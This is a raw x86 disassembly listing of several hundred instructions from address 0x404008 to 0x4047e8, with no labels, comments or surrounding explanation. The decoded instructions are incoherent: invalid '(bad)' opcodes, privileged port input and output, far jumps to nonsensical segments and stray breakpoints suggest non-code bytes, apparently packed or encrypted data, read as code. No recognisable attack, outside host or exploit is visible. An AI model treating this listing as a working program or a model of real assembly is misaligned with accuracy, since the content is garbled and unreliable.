  404008:	imul   eax,DWORD PTR [ebx],0xffffffbc
  40400b:	out    dx,eax
  40400c:	imul   esi,DWORD PTR [ebx],0x392fdd27
  404012:	ret    
  404013:	ja     0x404029
  404015:	cld    
  404016:	mov    ds:0xf7ddd736,eax
  40401b:	pusha  
  40401c:	int3   
  40401d:	call   FWORD PTR [edx+0x2d]
  404020:	mov    dl,0x47
  404022:	xchg   ecx,eax
  404023:	pop    ebx
  404024:	and    dl,BYTE PTR [ecx+0x15]
  404027:	mov    al,ds:0x21e30856
  40402c:	scas   al,BYTE PTR es:[edi]
  40402d:	mul    DWORD PTR [esp+eiz*2-0x2e]
  404031:	xor    ch,BYTE PTR [esp+eiz*2]
  404034:	lahf   
  404035:	inc    ebp
  404036:	sbb    al,BYTE PTR [eax]
  404038:	xchg   esi,eax
  404039:	out    0xf9,eax
  40403b:	dec    ecx
  40403c:	js     0x403fd1
  40403e:	rcl    BYTE PTR [eax],cl
  404040:	sbb    dl,BYTE PTR [ecx+eiz*8+0x2cfa9a5c]
  404047:	pop    ds
  404048:	sbb    BYTE PTR [edi],dh
  40404a:	inc    ecx
  40404b:	dec    ebx
  40404c:	div    DWORD PTR [esp+eiz*4]
  40404f:	xchg   esp,eax
  404050:	inc    edx
  404051:	jmp    0x404014
  404053:	mov    WORD PTR [eax+0x4fec36c1],gs
  404059:	ja     0x404091
  40405b:	jg     0x40408e
  40405d:	xchg   ebx,eax
  40405e:	push   0x4f
  404060:	stos   DWORD PTR es:[edi],eax
  404061:	sbb    al,0xa4
  404063:	xor    BYTE PTR [edx+esi*4+0x56],dl
  404067:	iret   
  404068:	pushf  
  404069:	push   ds
  40406a:	mov    bh,0x9c
  40406c:	mov    WORD PTR [eax],ds
  40406e:	inc    esi
  40406f:	int3   
  404070:	mov    edi,0x772de19d
  404075:	mov    gs,WORD PTR [ebx-0xd]
  404078:	out    dx,eax
  404079:	test   DWORD PTR [ecx+0x7acbdf04],ebp
  40407f:	stos   BYTE PTR es:[edi],al
  404080:	shl    ecx,0xa7
  404083:	out    0xea,eax
  404085:	mov    WORD PTR [edx+0x67580ba9],?
  40408b:	xlat   BYTE PTR ds:[ebx]
  40408c:	push   ebx
  40408d:	mov    edx,0x1afc772e
  404092:	or     al,0xaf
  404094:	lock cld 
  404096:	and    cl,BYTE PTR [esi+0x58e78360]
  40409c:	jmp    0xf9d032e9
  4040a1:	and    eax,0x7e3150cb
  4040a6:	mov    eax,ds:0x41aba370
  4040ab:	cmp    BYTE PTR [esi+ebp*2],cl
  4040ae:	xor    al,0x79
  4040b0:	jne    0x404052
  4040b2:	adc    eax,0x590f879c
  4040b7:	mov    esi,0x20c791ec
  4040bc:	mov    ebx,0x17374fa8
  4040c1:	mov    ebp,DWORD PTR [edi+edx*4]
  4040c4:	inc    ebp
  4040c5:	fcomi  st,st(3)
  4040c7:	retf   
  4040c8:	adc    esi,DWORD PTR [edi]
  4040ca:	pop    esp
  4040cb:	fwait
  4040cc:	or     BYTE PTR [eax-0x2d],bl
  4040cf:	lods   al,BYTE PTR ds:[esi]
  4040d0:	dec    esp
  4040d1:	aas    
  4040d2:	fsubr  DWORD PTR [edx+0x62]
  4040d5:	cli    
  4040d6:	sbb    bl,BYTE PTR [ebp-0x36]
  4040d9:	add    al,0xca
  4040db:	hlt    
  4040dc:	inc    ebx
  4040dd:	inc    ebp
  4040de:	pushf  
  4040df:	test   bh,bh
  4040e1:	pop    es
  4040e2:	fbld   TBYTE PTR ds:0xa529be75
  4040e8:	push   0x6b6acae2
  4040ed:	jl     0x404108
  4040ef:	imul   ebp,DWORD PTR cs:[ebp+0x669a14d4],0x25
  4040f7:	out    0xc0,eax
  4040f9:	jmp    0x837c:0x18e44be9
  404100:	sbb    edi,DWORD PTR [ebp-0x13f00b47]
  404106:	xchg   ecx,eax
  404107:	push   es
  404108:	sahf   
  404109:	pop    ecx
  40410a:	clc    
  40410b:	pushf  
  40410c:	or     BYTE PTR [edx+ebx*4-0x24],0x1b
  404111:	outs   dx,DWORD PTR ds:[esi]
  404112:	or     esi,DWORD PTR [edi+edx*2-0x49e5112e]
  404119:	mov    esp,0x98631fd5
  40411e:	enter  0xb95a,0xd1
  404122:	sub    eax,0x810ad6ef
  404127:	jno    0x4040cc
  404129:	push   esp
  40412a:	les    esi,FWORD PTR [ebp+0x74]
  40412d:	iret   
  40412e:	mov    es,WORD PTR [edi]
  404130:	mov    eax,0xbbadd35f
  404135:	xchg   edi,eax
  404136:	dec    edi
  404137:	mov    DWORD PTR [ebp+esi*8+0x182c510c],ebp
  40413e:	mov    bl,ah
  404140:	arpl   WORD PTR [ebx-0xb],dx
  404143:	lea    ebx,[bp-0x5b29]
  404148:	outs   dx,BYTE PTR gs:[esi]
  40414a:	push   es
  40414b:	jbe    0x404131
  40414d:	sub    DWORD PTR [ebx],0x63
  404150:	jmp    0x40419d
  404152:	mov    ecx,0xc7f2dfdc
  404157:	mov    ecx,0xc6fa627
  40415c:	es dec edi
  40415e:	cmovne ebp,ebp
  404161:	sub    ebp,DWORD PTR [esi]
  404163:	jbe    0x404192
  404165:	fild   WORD PTR [esi+0x54]
  404168:	je     0x4041b2
  40416a:	push   edx
  40416b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40416c:	xchg   DWORD PTR [esp+eiz*8-0x37efb61c],eax
  404173:	jmp    0xf32b:0x4803037f
  40417a:	ins    DWORD PTR es:[edi],dx
  40417b:	pop    ebx
  40417c:	dec    esp
  40417d:	jecxz  0x40413a
  40417f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404180:	xchg   BYTE PTR [edx+0x7462017b],cl
  404186:	or     eax,0x3050562d
  40418b:	sbb    al,BYTE PTR [edx-0x4ceb9d64]
  404191:	xchg   BYTE PTR [ebp+ebx*1-0x9c020ce],ah
  404198:	or     al,0xb0
  40419a:	xchg   edx,ecx
  40419c:	popa   
  40419d:	bound  ebx,QWORD PTR [ebp-0x35d6c93f]
  4041a3:	call   0xd06f0335
  4041a8:	sub    ecx,edx
  4041aa:	outs   dx,BYTE PTR ds:[esi]
  4041ab:	(bad)  
  4041ac:	mov    edx,0x5c4c8595
  4041b1:	or     BYTE PTR [eax+0x35],ch
  4041b4:	cmp    edi,ecx
  4041b6:	data16 stos BYTE PTR es:[edi],al
  4041b8:	fld    QWORD PTR [ebx-0x795a1e30]
  4041be:	(bad)  
  4041bf:	inc    edx
  4041c0:	fwait
  4041c1:	mov    edi,0x4ff1a4fd
  4041c6:	adc    bl,BYTE PTR [ebx]
  4041c8:	dec    ebp
  4041c9:	mov    ?,WORD PTR [edi]
  4041cb:	lods   al,BYTE PTR ds:[esi]
  4041cc:	cmp    bh,BYTE PTR [edi-0x51b917d5]
  4041d2:	out    dx,eax
  4041d3:	xchg   BYTE PTR [ecx-0x7ef040e4],bl
  4041d9:	icebp  
  4041da:	rcr    DWORD PTR [ebp+0x2d5c20fb],1
  4041e0:	mov    ds:0x145b8ec4,al
  4041e5:	dec    edx
  4041e6:	cld    
  4041e7:	in     eax,0x4
  4041e9:	lock (bad) 
  4041eb:	pop    ebx
  4041ec:	mov    eax,ds:0xecfa49c8
  4041f1:	lds    ecx,FWORD PTR [eax+ebp*1-0x22d9563c]
  4041f8:	jecxz  0x40425f
  4041fa:	loopne 0x40420a
  4041fc:	jl     0x404272
  4041fe:	or     esp,ecx
  404200:	xor    esp,esi
  404202:	inc    ebx
  404203:	add    eax,0x972eb6c9
  404208:	in     eax,0x79
  40420a:	fs aam 0x65
  40420d:	cmp    al,0xdc
  40420f:	mov    ecx,DWORD PTR [edi+eiz*2]
  404212:	popa   
  404213:	neg    ah
  404215:	sub    BYTE PTR [ecx-0x61d5cfd3],bl
  40421b:	inc    ebx
  40421c:	es inc esi
  40421e:	out    dx,al
  40421f:	sahf   
  404220:	mov    esp,0x3eabfafc
  404225:	mul    BYTE PTR [ebp-0x78]
  404228:	push   esi
  404229:	fwait
  40422a:	pop    ebx
  40422b:	js     0x4041dc
  40422d:	fsub   st(4),st
  40422f:	jb     0x4041e3
  404231:	pushf  
  404232:	xchg   BYTE PTR [edi-0x2e],ch
  404235:	xchg   DWORD PTR [esi+edx*2+0x59183697],esi
  40423c:	and    edi,0xffffff8a
  40423f:	push   esi
  404240:	xor    eax,0x58f5bc3e
  404245:	outs   dx,BYTE PTR ds:[esi]
  404246:	push   eax
  404247:	xor    eax,0xe4eafc67
  40424c:	xor    DWORD PTR [esp+eax*8],edx
  40424f:	xor    cl,BYTE PTR [ecx]
  404251:	pop    ebx
  404252:	push   ebp
  404253:	call   0x587fc110
  404258:	ins    BYTE PTR es:[edi],dx
  404259:	cmp    ch,BYTE PTR [ecx]
  40425b:	jmp    0x404233
  40425d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40425e:	xchg   BYTE PTR fs:[edi],bh
  404261:	sar    DWORD PTR [eax-0x41768d34],cl
  404267:	mov    ebx,0x571f6341
  40426c:	ds inc eax
  40426f:	test   eax,0xb9e10d09
  404274:	pop    ds
  404275:	lods   al,BYTE PTR ds:[esi]
  404276:	les    ebp,FWORD PTR [ecx-0x31]
  404279:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40427a:	scas   al,BYTE PTR es:[edi]
  40427b:	mov    eax,0xd90c1057
  404280:	icebp  
  404281:	shr    al,cl
  404283:	lods   al,BYTE PTR ds:[esi]
  404284:	(bad)  
  404285:	cmc    
  404286:	imul   BYTE PTR [eax-0x66939104]
  40428c:	cmp    dh,BYTE PTR [edx-0x7ba3b041]
  404292:	data16 cmp bl,bl
  404295:	sar    DWORD PTR [ebx+0x56730ac1],0x9c
  40429c:	xchg   BYTE PTR [edi+0x18d06689],dh
  4042a2:	sbb    ecx,DWORD PTR [edi]
  4042a4:	mov    WORD PTR [esi-0x1f],?
  4042a7:	inc    edi
  4042a8:	jmp    0xd53c5db8
  4042ad:	jp     0x404313
  4042af:	mov    esp,0xfe1c2a3f
  4042b4:	cmp    eax,DWORD PTR [eax]
  4042b6:	fadd   st(0),st
  4042b8:	into   
  4042b9:	outs   dx,DWORD PTR ds:[esi]
  4042ba:	push   0x2d
  4042bc:	pop    esp
  4042bd:	pop    ds
  4042be:	jae    0x4042d2
  4042c0:	js     0x404291
  4042c2:	mov    al,ds:0x3f25e06a
  4042c7:	push   edx
  4042c8:	lock mov esp,0x4d03461d
  4042ce:	fwait
  4042cf:	out    dx,al
  4042d0:	jnp    0x404296
  4042d2:	sar    BYTE PTR [esi+0x771e70c9],0xc5
  4042d9:	jmp    0x715ff29
  4042de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042df:	jmp    edx
  4042e1:	enter  0x3893,0xf0
  4042e5:	add    BYTE PTR [esi-0x1f],dl
  4042e8:	push   es
  4042e9:	std    
  4042ea:	shl    DWORD PTR [edi+0x22b75e81],1
  4042f0:	mov    ds:0x10ac3f03,eax
  4042f5:	out    0x2b,al
  4042f7:	icebp  
  4042f8:	in     al,dx
  4042f9:	dec    ebp
  4042fa:	mov    al,0xfa
  4042fc:	les    esi,FWORD PTR [ebx-0x80aa341]
  404302:	mov    dh,0xee
  404304:	(bad)  
  404306:	cmp    BYTE PTR [edx-0x47],bh
  404309:	std    
  40430a:	add    al,0x4f
  40430c:	add    ebx,0x64a74428
  404312:	cs ret 
  404314:	cmc    
  404315:	cli    
  404316:	dec    edx
  404317:	mul    BYTE PTR [edx-0x64a2c968]
  40431d:	stos   BYTE PTR es:[edi],al
  40431e:	out    dx,al
  40431f:	in     eax,0xe3
  404321:	push   cs
  404322:	jg     0x404335
  404324:	arpl   WORD PTR [ebx+0x24be6f99],bx
  40432a:	pop    edx
  40432b:	push   es
  40432c:	jl     0x404382
  40432e:	and    eax,DWORD PTR [eax+0x33d54679]
  404334:	push   es
  404335:	xchg   DWORD PTR [ebp+0x348a773a],ebp
  40433b:	sub    ah,BYTE PTR es:[edi+0x1c]
  40433f:	inc    esp
  404340:	dec    esi
  404341:	adc    eax,0x5f5da231
  404346:	and    esi,DWORD PTR [ecx]
  404348:	mov    BYTE PTR [ecx],0xe
  40434b:	clc    
  40434c:	push   ebx
  40434d:	push   esi
  40434e:	test   BYTE PTR [ebx],bl
  404350:	xchg   edi,eax
  404351:	sub    bh,BYTE PTR [esi]
  404353:	inc    esi
  404354:	clc    
  404355:	cmp    bl,BYTE PTR [ecx-0x3e92f675]
  40435b:	loope  0x4043da
  40435d:	jnp    0x40434e
  40435f:	fs mov ecx,0xcdd78602
  404365:	adc    bl,dh
  404367:	xchg   ecx,eax
  404368:	sub    al,0x40
  40436a:	imul   ecx,DWORD PTR [ebx],0xd752416e
  404370:	mov    WORD PTR [ebp-0x7d09a395],?
  404376:	xchg   ecx,eax
  404377:	pusha  
  404378:	lahf   
  404379:	int3   
  40437a:	int    0x49
  40437c:	mov    dl,0xfa
  40437e:	das    
  40437f:	sub    ebp,edi
  404381:	test   bh,ah
  404383:	test   al,0x59
  404385:	jge    0x40434e
  404387:	xor    eax,0x6b7f7f88
  40438c:	push   0xfffffffd
  40438e:	in     eax,dx
  40438f:	jae    0x404384
  404391:	mov    esi,0xa9eb1c7c
  404396:	xchg   edi,eax
  404397:	pop    ebx
  404398:	inc    ecx
  404399:	inc    edi
  40439a:	push   cs
  40439b:	inc    eax
  40439c:	jns    0x4043b9
  40439e:	je     0x4043d6
  4043a0:	jns    0x404389
  4043a2:	adc    al,0x8b
  4043a4:	jo     0x4043ca
  4043a6:	sub    cl,BYTE PTR [ecx]
  4043a8:	ja     0x404409
  4043aa:	cmp    bl,BYTE PTR [edx+0x5cf26105]
  4043b0:	mov    ecx,0xa0595aa4
  4043b5:	and    esp,DWORD PTR [ebx-0x5d4f925a]
  4043bb:	and    BYTE PTR [ebx-0x2450f7fe],ah
  4043c1:	enter  0x876d,0x78
  4043c5:	mov    esi,0x4a1b639a
  4043ca:	lahf   
  4043cb:	jb     0x4043ee
  4043cd:	(bad)  
  4043ce:	rol    dl,cl
  4043d0:	pop    ecx
  4043d1:	iret   
  4043d2:	mov    ds:0x535ce362,al
  4043d7:	xlat   BYTE PTR ds:[ebx]
  4043d8:	jns    0x40435b
  4043da:	mov    bh,0xe1
  4043dc:	ja     0x4043d2
  4043de:	nop
  4043df:	cmp    bh,BYTE PTR [ecx]
  4043e1:	xor    edx,DWORD PTR [eax-0x31]
  4043e4:	js     0x4043b7
  4043e6:	loope  0x404385
  4043e8:	hlt    
  4043e9:	adc    eax,esp
  4043eb:	dec    edx
  4043ec:	fdivr  DWORD PTR [ebx-0x4d]
  4043ef:	into   
  4043f0:	out    0xe6,al
  4043f2:	mov    cl,0xee
  4043f4:	(bad)  
  4043f5:	mov    esp,0x3c092926
  4043fa:	xor    BYTE PTR [edi-0x3bc4fe5f],bh
  404400:	xchg   ebx,eax
  404401:	les    ecx,FWORD PTR [esi-0x70]
  404404:	cwde   
  404405:	stos   DWORD PTR es:[edi],eax
  404406:	bound  edi,QWORD PTR [edi+0x35]
  404409:	hlt    
  40440a:	aad    0xf1
  40440c:	pop    esi
  40440d:	adc    ah,BYTE PTR [edx+esi*1]
  404410:	fwait
  404411:	adc    bl,BYTE PTR [esi-0x72050fa6]
  404417:	mov    esi,0xceb52f15
  40441c:	in     al,dx
  40441d:	dec    ebp
  40441e:	aaa    
  40441f:	sti    
  404420:	in     al,0xa3
  404422:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404423:	mov    ah,0x3a
  404425:	xchg   edx,eax
  404426:	and    DWORD PTR [edi+0x3bb56efe],ebx
  40442c:	jo     0x40446c
  40442e:	cmp    eax,0xeaf08b70
  404433:	pop    ecx
  404434:	sub    al,0xf1
  404436:	int    0x90
  404438:	jl     0x404456
  40443a:	neg    edx
  40443c:	test   BYTE PTR [ecx],dl
  40443e:	pop    esp
  40443f:	or     al,0xd4
  404441:	and    bh,bh
  404443:	mov    dl,0xbb
  404445:	out    dx,al
  404446:	fwait
  404447:	sub    eax,0x7d939de2
  40444c:	mov    es,ecx
  40444e:	xchg   ebp,eax
  40444f:	mov    dh,0xd1
  404451:	mov    ah,dl
  404453:	cmp    al,0xbe
  404455:	es ss cmc 
  404458:	pop    ds
  404459:	adc    eax,0x2d34bbaf
  40445e:	mov    esp,0x7db8d4cf
  404463:	sahf   
  404464:	or     eax,DWORD PTR [edi-0x37]
  404467:	imul   edx,DWORD PTR [eax],0x26c567d4
  40446d:	aas    
  40446e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40446f:	or     DWORD PTR [ebp-0x1f],ebx
  404472:	xor    eax,0x4891e66f
  404477:	out    dx,al
  404478:	cld    
  404479:	dec    ebp
  40447a:	(bad)  
  40447b:	push   eax
  40447c:	in     al,0x31
  40447e:	pusha  
  40447f:	outs   dx,BYTE PTR ds:[esi]
  404480:	add    eax,0x20817857
  404485:	mov    BYTE PTR [edx+0x31],bl
  404488:	or     BYTE PTR [ebx+0x63],dh
  40448b:	push   ecx
  40448c:	jbe    0x4044fe
  40448e:	push   0xe412d800
  404493:	dec    eax
  404494:	xchg   DWORD PTR [ebp+0x5c],eax
  404497:	inc    ebp
  404498:	ror    BYTE PTR [edi+ebp*2-0x16ce44c],1
  40449f:	push   ebx
  4044a0:	inc    ebx
  4044a1:	in     eax,0x31
  4044a3:	push   0x74
  4044a5:	push   ss
  4044a6:	jbe    0x404499
  4044a8:	and    DWORD PTR [esi+0x9ca4f9f],ecx
  4044ae:	call   0x83bb:0xe7075de5
  4044b5:	inc    edi
  4044b6:	mov    al,ds:0xaf0769fe
  4044bb:	cmpps  xmm7,XMMWORD PTR [ecx+0x387b1660],0xa9
  4044c3:	popf   
  4044c4:	mov    al,ds:0xd8c404e3
  4044c9:	or     BYTE PTR [eax+0x2e],0x4c
  4044cd:	jae    0x404477
  4044cf:	pop    ebp
  4044d0:	mov    ch,0xa7
  4044d2:	pop    ss
  4044d3:	jne    0x4044d7
  4044d5:	pop    esp
  4044d6:	ins    DWORD PTR es:[edi],dx
  4044d7:	inc    esp
  4044d8:	mov    edi,ebp
  4044da:	gs call 0x285b983b
  4044e0:	or     eax,0xf11be94
  4044e5:	je     0x404479
  4044e7:	or     ebx,DWORD PTR [ecx+0x6fa4b867]
  4044ed:	inc    eax
  4044ee:	dec    edx
  4044ef:	repz fbstp TBYTE PTR [eax+eax*2-0x45]
  4044f4:	mov    WORD PTR [eax+0x2cd8f1bb],es
  4044fa:	rol    edi,1
  4044fc:	jae    0x4044b6
  4044fe:	(bad)  
  4044ff:	adc    dh,BYTE PTR [ecx]
  404501:	popf   
  404502:	xchg   edx,eax
  404503:	je     0x4044d0
  404505:	jbe    0x404571
  404507:	mov    cl,0x7d
  404509:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40450a:	push   ebx
  40450b:	aad    0x47
  40450d:	or     esp,DWORD PTR [ebp-0x212ca94c]
  404513:	dec    esp
  404514:	cmp    eax,0x45ada7b
  404519:	imul   edi,DWORD PTR [ebp+0x4466e140],0xe3009e55
  404523:	test   eax,0xe03aa229
  404528:	mov    ebp,DWORD PTR [eax-0x168b1f57]
  40452e:	repz js 0x4044fb
  404531:	loop   0x40459d
  404533:	adc    ecx,DWORD PTR [ebp-0x4b]
  404536:	in     al,dx
  404537:	dec    eax
  404538:	(bad)  
  404539:	popf   
  40453a:	xchg   edx,eax
  40453b:	dec    ecx
  40453c:	dec    ebx
  40453d:	inc    esi
  40453e:	lock jo 0x4044ff
  404541:	xchg   esi,eax
  404542:	mov    BYTE PTR [edi-0x79],bh
  404545:	out    0xa4,al
  404547:	fcom   DWORD PTR [esi]
  404549:	or     DWORD PTR [edi+0xb],edi
  40454c:	push   cs
  40454d:	retf   
  40454e:	lods   al,BYTE PTR ds:[esi]
  40454f:	dec    ebp
  404550:	je     0x404548
  404552:	push   0x26
  404554:	jb     0x404500
  404556:	jp     0x4044ec
  404558:	or     BYTE PTR [eax-0x51],bh
  40455b:	jp     0x404565
  40455d:	outs   dx,DWORD PTR ds:[esi]
  40455e:	aaa    
  40455f:	js     0x404538
  404561:	xchg   esi,eax
  404562:	or     DWORD PTR [ebp-0x466253e5],esi
  404568:	and    BYTE PTR [ebp-0x15b129d0],0xcd
  40456f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404570:	in     ax,dx
  404572:	and    eax,0xbea10f0b
  404577:	(bad)
  40457a:	popa   
  40457b:	into   
  40457c:	xchg   esi,eax
  40457d:	outs   dx,DWORD PTR ds:[esi]
  40457e:	lods   al,BYTE PTR ds:[esi]
  40457f:	out    dx,al
  404580:	push   edx
  404581:	aaa    
  404582:	jnp    0x40451c
  404584:	retf   
  404585:	retf   
  404586:	popa   
  404587:	push   cs
  404588:	ss xor eax,0xd1c636a6
  40458e:	xor    DWORD PTR [edi+0x27],ebx
  404591:	pop    ds
  404592:	cs pop esp
  404594:	jmp    0x83b1b9a8
  404599:	xlat   BYTE PTR ds:[ebx]
  40459a:	cmp    BYTE PTR [edi+eax*2],dl
  40459d:	fwait
  40459e:	xor    eax,0xb8ed5316
  4045a3:	cmp    eax,0x4057fcea
  4045a8:	mov    al,ds:0xa6410f1b
  4045ad:	cmp    BYTE PTR [esi+0x8],ch
  4045b0:	jns    0x404545
  4045b2:	pop    ds
  4045b3:	mul    DWORD PTR [edx-0x71646139]
  4045b9:	push   ebx
  4045ba:	out    0x79,eax
  4045bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045bd:	enter  0x7af,0x4f
  4045c1:	outs   dx,DWORD PTR ds:[esi]
  4045c2:	push   ss
  4045c3:	mov    edi,0x2cc5de0c
  4045c8:	fbstp  TBYTE PTR [ebx-0x16]
  4045cb:	in     eax,dx
  4045cc:	mov    esi,ebx
  4045ce:	ins    BYTE PTR es:[edi],dx
  4045cf:	jg     0x404630
  4045d1:	daa    
  4045d2:	and    eax,0xc4f327b2
  4045d7:	adc    DWORD PTR [edx+0x3766737e],ebx
  4045dd:	in     al,0x93
  4045df:	aad    0xd
  4045e1:	add    ecx,edi
  4045e3:	mov    dl,0xe7
  4045e5:	fidivr WORD PTR [esi]
  4045e7:	dec    edi
  4045e8:	shr    DWORD PTR [ebp+ebp*8-0x6],0xaf
  4045ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045ee:	popa   
  4045ef:	dec    esp
  4045f0:	adc    DWORD PTR [eax+ecx*2-0x22696a69],edx
  4045f7:	inc    ebp
  4045f8:	sub    eax,0x31b8bcbe
  4045fd:	pusha  
  4045fe:	dec    ebx
  4045ff:	dec    ebp
  404600:	stos   DWORD PTR es:[edi],eax
  404601:	jmp    0xfbff:0xcc8a477a
  404608:	stos   BYTE PTR es:[edi],al
  404609:	ret    0x6770
  40460c:	dec    esp
  40460d:	bnd ret 0xd4
  404611:	out    dx,eax
  404612:	mov    bl,0xc3
  404614:	push   edi
  404615:	add    eax,0x3a8515d2
  40461a:	jae    0x404657
  40461c:	mov    ds:0x8ea7661c,al
  404621:	je     0x404691
  404623:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404624:	jge    0x404645
  404626:	in     eax,dx
  404627:	cwde   
  404628:	in     al,dx
  404629:	mov    esi,0xedcf98bf
  40462e:	lds    eax,FWORD PTR [edi+0x71]
  404631:	lahf   
  404632:	ss repz cli 
  404635:	mul    dl
  404637:	out    dx,al
  404638:	sbb    al,0x7c
  40463a:	push   es
  40463b:	xor    esi,DWORD PTR [ebp+0x3c]
  40463e:	pushf  
  40463f:	pop    esi
  404640:	test   eax,0xe0e84ec9
  404645:	sar    BYTE PTR [edi],0xcd
  404648:	in     eax,dx
  404649:	neg    DWORD PTR [edx+0x77]
  40464c:	test   al,0xd2
  40464e:	in     eax,0xce
  404650:	lds    ebx,FWORD PTR [edi-0xcd0982e]
  404656:	in     al,dx
  404657:	push   ecx
  404658:	jmp    0x40467b
  40465a:	mov    al,0xdd
  40465c:	scas   al,BYTE PTR es:[edi]
  40465d:	add    al,cl
  40465f:	pop    DWORD PTR [edi+0x12]
  404662:	sar    DWORD PTR [edx+0x9],1
  404665:	popa   
  404666:	add    dl,BYTE PTR [eax+0x5b]
  404669:	dec    ecx
  40466a:	push   esp
  40466b:	inc    esi
  40466c:	or     DWORD PTR [edi],edx
  40466e:	lods   eax,DWORD PTR ds:[esi]
  40466f:	es call 0xebe9:0xc09a607f
  404677:	and    DWORD PTR [esi+0x4e],0x9a19bf3b
  40467e:	bound  esp,QWORD PTR [edi+0x5a064573]
  404684:	mov    edi,0xe2754e35
  404689:	sub    eax,0x90d82f6b
  40468e:	jbe    0x40470d
  404690:	add    bl,BYTE PTR [edi*1+0x620f8dab]
  404697:	js     0x4046d9
  404699:	iret   
  40469a:	scas   eax,DWORD PTR es:[edi]
  40469b:	xchg   edx,eax
  40469c:	gs ror esi,1
  40469f:	add    al,0xea
  4046a1:	push   eax
  4046a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046a3:	addr16 mov ebx,0x34f4656
  4046a9:	loop   0x404704
  4046ab:	pop    edx
  4046ac:	adc    ah,al
  4046ae:	xchg   ebx,eax
  4046af:	scas   eax,DWORD PTR es:[edi]
  4046b0:	call   0x181b:0x3ac8e30b
  4046b7:	cs hlt 
  4046b9:	data16 add bh,BYTE PTR [eax+0x5d]
  4046bd:	shr    DWORD PTR [ebx],0x21
  4046c0:	idiv   BYTE PTR [ebx+0x78ef9c51]
  4046c6:	mov    ds,WORD PTR [ebx+eiz*8-0x73b419ad]
  4046cd:	stos   DWORD PTR es:[edi],eax
  4046ce:	fdivr  QWORD PTR [esi]
  4046d0:	adc    ebp,DWORD PTR [edx]
  4046d2:	jne    0x404745
  4046d4:	pop    ds
  4046d5:	add    eax,0x83718d6f
  4046da:	jle    0x404759
  4046dc:	imul   edx,DWORD PTR [ebx-0x7def1a13],0xffffff99
  4046e3:	or     dh,BYTE PTR [eax+eiz*4-0x2a]
  4046e7:	sbb    ah,BYTE PTR [ebx-0x43]
  4046ea:	cmp    al,BYTE PTR [esi+edi*2-0x4b5c6d5c]
  4046f1:	jns    0x404704
  4046f3:	pop    edi
  4046f4:	dec    esp
  4046f5:	sbb    al,0x8a
  4046f7:	cs cmp eax,0xffffffc8
  4046fb:	test   ch,bl
  4046fd:	enter  0xf67,0x14
  404701:	fs ret 
  404703:	lahf   
  404704:	sub    esp,DWORD PTR [ebp-0x1739d6ac]
  40470a:	leave  
  40470b:	push   ss
  40470c:	xchg   ah,ah
  40470e:	(bad)  
  40470f:	mov    edx,0xf1a4d8ba
  404714:	mov    edi,0x32cade07
  404719:	retf   
  40471a:	xlat   BYTE PTR ds:[ebx]
  40471b:	loop   0x4046f9
  40471d:	and    BYTE PTR [eax+0x79f470c],0x6d
  404724:	ret    0xefb6
  404727:	ins    BYTE PTR es:[edi],dx
  404728:	je     0x4046ed
  40472a:	dec    edx
  40472b:	xchg   edi,eax
  40472c:	pop    ebx
  40472d:	mov    ch,0x47
  40472f:	push   esp
  404730:	imul   edx,ecx,0x3a
  404733:	cmp    bh,BYTE PTR [edx-0x13]
  404736:	push   ebp
  404737:	ret    0xb328
  40473a:	ja     0x404710
  40473c:	sti    
  40473d:	fidivr WORD PTR [ebp+edx*4+0x64]
  404741:	sar    BYTE PTR [esi],0xaf
  404744:	jns    0x404729
  404746:	sub    eax,0xf33cf575
  40474b:	pop    eax
  40474c:	ror    BYTE PTR [edi+0x30],0x1f
  404750:	sub    al,0x13
  404752:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  404754:	pop    edi
  404755:	cdq    
  404756:	add    al,0x50
  404758:	jo     0x404765
  40475a:	mov    eax,0xaf2fb9fe
  40475f:	addr16 xchg esi,eax
  404761:	stos   DWORD PTR es:[edi],eax
  404762:	leave  
  404763:	aas    
  404764:	adc    esp,ebp
  404766:	mov    ds:0x8890aaef,al
  40476b:	(bad)  
  40476c:	jmp    DWORD PTR [esi+0x78274af4]
  404772:	sbb    edi,DWORD PTR [edx+ecx*8+0x1d459629]
  404779:	cmp    edx,DWORD PTR [esi]
  40477b:	pop    edi
  40477c:	push   edx
  40477d:	jle    0x404744
  40477f:	cmp    ch,ch
  404781:	lahf   
  404782:	cwde   
  404783:	ret    
  404784:	inc    edi
  404785:	mov    eax,ds:0x4337b6fe
  40478a:	lods   eax,DWORD PTR ds:[esi]
  40478b:	stc    
  40478c:	add    dl,BYTE PTR [ecx-0x3b]
  40478f:	sar    BYTE PTR [edi+0x579c78ca],1
  404795:	push   ss
  404796:	push   ebx
  404797:	scas   eax,DWORD PTR es:[edi]
  404798:	and    DWORD PTR [edx+edi*4-0x5bef7f21],0xffffffb5
  4047a0:	mov    ebx,0x85606134
  4047a5:	push   esi
  4047a6:	call   0xd55c:0xde6c52b2
  4047ad:	out    dx,eax
  4047ae:	js     0x404743
  4047b0:	cmc    
  4047b1:	jae    0x4047e6
  4047b3:	adc    DWORD PTR [edx+ebp*4],eax
  4047b6:	mov    esp,0xf2f2ca9f
  4047bb:	mov    dh,ch
  4047bd:	scas   eax,DWORD PTR es:[edi]
  4047be:	out    0xb0,al
  4047c0:	(bad)  
  4047c2:	(bad)  
  4047c3:	inc    ebp
  4047c4:	add    BYTE PTR [edi+0x7d026c36],ch
  4047ca:	jp     0x4047ee
  4047cc:	ror    ebp,0x2b
  4047cf:	push   eax
  4047d0:	pop    eax
  4047d1:	ficomp DWORD PTR [ecx-0x5c]
  4047d4:	dec    edi
  4047d5:	add    BYTE PTR [eax+0x694384e2],cl
  4047db:	xchg   ecx,eax
  4047dc:	sbb    al,0x72
  4047de:	out    0x38,al
  4047e0:	jnp    0x4047d6
  4047e2:	dec    edi
  4047e3:	sbb    eax,0x1e3339a6
  4047e8:	add    esp,esp
